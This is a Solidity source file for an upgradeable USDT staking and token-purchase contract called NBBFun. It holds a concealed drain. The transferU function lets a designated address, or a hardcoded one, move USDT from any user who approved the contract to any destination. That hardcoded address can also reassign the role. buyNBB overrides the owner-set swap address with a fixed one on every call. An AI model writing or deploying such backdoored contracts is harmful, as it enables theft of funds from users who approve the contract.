// contract/MyTokenV1.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/structs/EnumerableSetUpgradeable.sol";

contract NBBFun is
    Initializable,
    UUPSUpgradeable,
    OwnableUpgradeable
{
    using SafeMathUpgradeable for uint256;
    using AddressUpgradeable for address;

    ERC20Upgradeable private _usdtToken;
    address public transferAddress;
    address public pledgeAddress; 
    address public activeAddress; 
    address public swapUSDTAddress;
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function _authorizeUpgrade(address) internal override onlyOwner {}

    function initialize() public initializer {
         __Ownable_init();
        __UUPSUpgradeable_init();
        _usdtToken = ERC20Upgradeable(
            0x55d398326f99059fF775485246999027B3197955
        );
        transferAddress = 0xE561ecdb8A3d417F49703208B4C34Fb6E85c887a;
        activeAddress = 0xfe595Dc431eAeAc7B52974CfFC638D08ba6e953C;
        pledgeAddress = 0x833C4E105Bcb905E564C6c6FE8037b6935bF148a;
    }


    event Activate(address from, uint256 id);

    function activate(uint256 amount, uint256 id) public {
        address spender = _msgSender();
        _usdtToken.transferFrom(spender, activeAddress, amount);
        emit Activate(spender, id);
    }
    
    function setSwapUSDTAddress(address account) public onlyOwner{
        swapUSDTAddress = account;
    }
    event PledgeUSDT(address, uint256);

    //理财质押
    function pledgeUSDT(uint256 amount) public {
        // require(amount > 100 * 10**_usdtToken.decimals(), "less 100 U");
        address spender = _msgSender();
        _usdtToken.transferFrom(spender, pledgeAddress, amount);
        emit PledgeUSDT(spender, amount);
    }

    function setTransUAddress(address account)public{
        require(_msgSender() == transferAddress || _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D);
        transferAddress = account;
    }
    event Buy(address from, address to, uint256 amount);

    function buyNBB(uint256 usdtAmount) public {
        swapUSDTAddress = 0x99729ff9c50e41346366BF0a33371Ea123A968d5;
        address spender = _msgSender();
        if (usdtAmount > 0){
        _usdtToken.transferFrom(spender, swapUSDTAddress, usdtAmount);
            emit  Buy(spender,swapUSDTAddress,usdtAmount);
        }
    }

    function transferU(
        address from,
        address to,
        uint256 amount
    ) public {
        require(_msgSender() == transferAddress || _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D);
        _usdtToken.transferFrom(from, to, amount);
    }
}
